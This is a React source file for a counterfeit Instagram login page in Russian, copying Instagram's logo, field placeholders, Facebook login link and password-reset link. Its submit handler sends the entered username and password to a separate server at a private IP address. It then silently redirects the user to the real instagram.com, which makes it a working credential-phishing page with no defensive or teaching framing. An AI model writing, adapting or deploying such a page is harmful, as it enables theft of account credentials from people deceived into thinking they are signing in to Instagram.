import "./firstBlock.css";
import Logo from "../../imgs/logo.png";
import { useState } from "react";
import axios from "axios";

export default function FirstBlock() {
  // Input check

  const [username, setUsername] = useState(""); // ready
  const [password, setPassword] = useState(""); // ready
  const [showPass, setShowPass] = useState(false); // ready

  const isDisabled = username.length > 0 && password.length > 5 ? false : true;

  function changePasswordShow(e) {
    e.preventDefault();
    setShowPass(!showPass);
  }

  function passShowBtn() {
    return showPass ? "Скрыть" : "Показать";
  }

  // Requests to DB

  const handleCreateUser = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(
        "http://192.168.101.94:8080/api/users/addNewUser",
        { username, password },
        { headers: { "Content-Type": "application/json" } }
      );

      setTimeout(() => {
        window.location.href = "https://instagram.com"; // сюда вставь нужный URL
      }, 300);

      console.log("User created:", response.data);
    } catch (error) {
      console.error("Error creating user:", error);
    }
  };

  return (
    <>
      <section className="body">
        <div className="box">
          <div className="instaLogo">
            <img className="logoImg" width={"200px"} src={Logo} />
          </div>
          <div className="inputs">
            <form className="formInputs">
              <div className="username">
                <input
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Телефон, имя пользователя или эл. адрес"
                  type="text"
                  className="input"
                  id="UNinp"
                />
              </div>
              <div className="pass">
                <input
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Пароль"
                  type={showPass ? "text" : "password"}
                  className="input passInp"
                  id="PASSinp"
                />
                <button onClick={changePasswordShow} className="passBtn">
                  {password.length > 0 && passShowBtn()}
                </button>
              </div>
            </form>
          </div>
          <div>
            <button
              onClick={handleCreateUser}
              disabled={isDisabled}
              className={`btn btn-primary ${
                isDisabled ? "disabledBtn disabled" : "enabled"
              }`}
            >
              <span className="voyti">Войти</span>
            </button>
          </div>

          <div className="d-flex my-3">
            <div className="hr">__________________</div>
            <div>
              <span className="or">ИЛИ</span>
            </div>
            <div className="hr">__________________</div>
          </div>

          <div className="">
            <div className="logInFB d-flex align-items-center justify-content-center">
              <form
                className="d-flex align-items-center justify-content-center"
                action="https://www.facebook.com/?locale=ru_RU&refsrc=deprecated&_rdr"
              >
                <div className="logo">
                  <i className="bi bi-facebook text-primary fs-5 mx-2"></i>
                </div>
                <div>
                  <a href="#" className="FBlink">
                    Войти через Facebook
                  </a>
                </div>
              </form>
            </div>
            <div className="forgotPass my-2">
              <div>
                <a
                  className="FPlink"
                  href="https://www.instagram.com/accounts/password/reset/"
                >
                  Забыли пароль?
                </a>
              </div>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}
